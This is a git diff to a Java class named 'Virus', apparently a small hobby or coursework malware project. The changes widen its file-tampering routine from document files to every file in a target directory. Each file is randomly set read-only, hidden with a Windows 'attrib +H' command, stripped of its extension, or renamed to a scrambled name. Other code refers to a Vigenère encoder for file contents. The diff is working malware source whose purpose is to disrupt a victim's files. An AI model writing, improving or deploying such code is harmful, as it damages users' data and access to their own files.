@@ -2,6 +2,7 @@ package model;
 
 import coder.Mixer;
 import coder.VigenereCoder;
+import input_output.CommandLineInterpreter;
 import input_output.IOFileHandling;
 import org.apache.commons.io.FilenameUtils;
 
@@ -63,34 +64,38 @@ public class Virus {
     }
 
     public static void changeFilesAttributes() {
-        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
+        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, file -> true);
         for (String s : filesList) {
             File file = new File(s);
-            try {
-                switch ((int) (Math.random() * 4)) {
-                    case 0: {
-                        file.setReadOnly();
-                        break;
-                    }
-                    case 1: {
-                        Runtime.getRuntime().exec("attrib +H " + s);
-                        break;
-                    }
-                    case 2: {
-                        file.renameTo(new File(s.substring(0, s.indexOf("."))));
-                        break;
-                    }
-                    case 3: {
-                        String filePath = Paths.get(s).getParent().toString();
-                        String extension = "." + FilenameUtils.getExtension(s);
-                        String fileName = s.substring(s.lastIndexOf('\\', s.indexOf('.')));
-                        fileName = Mixer.encode(fileName);
-                        file.renameTo(new File(filePath + fileName + extension));
-                        break;
-                    }
+            switch ((int) (Math.random() * 4)) {
+                case 0: {
+                    file.setReadOnly();
+                    break;
                 }
-            } catch (IOException e) {
-                e.getMessage();
+                case 1: {
+                    CommandLineInterpreter.sendCommand("attrib +H " + s);
+                    break;
+                }
+                case 2: {
+                    int dotIndex = s.indexOf(".");
+                    if (dotIndex > 0) {
+                        file.renameTo(new File(s.substring(0, s.indexOf("."))));
+                    }
+                    break;
+                }
+                case 3: {
+                    String filePath = Paths.get(s).getParent().toString();
+                    String extension = null;
+                    String fileName = null;
+                    int dotIndex = s.indexOf(".");
+                    if (dotIndex > 0) {
+                        extension = "." + FilenameUtils.getExtension(s);
+                        fileName = s.substring(s.lastIndexOf('\\', s.indexOf('.')));
+                        fileName = Mixer.encode(fileName);
+                    }
+                    file.renameTo(new File(filePath + fileName + extension));
+                    break;
+                }
             }
         }
     }
@@ -150,7 +155,6 @@ public class Virus {
 
     private static String prepareInputText(String fileName) {
         String text = IOFileHandling.readFromFile(fileName);
-        System.out.println("text: " + text);
         VigenereCoder.getInstance().setAlphabet(ALPHABET);
         return text;
     }
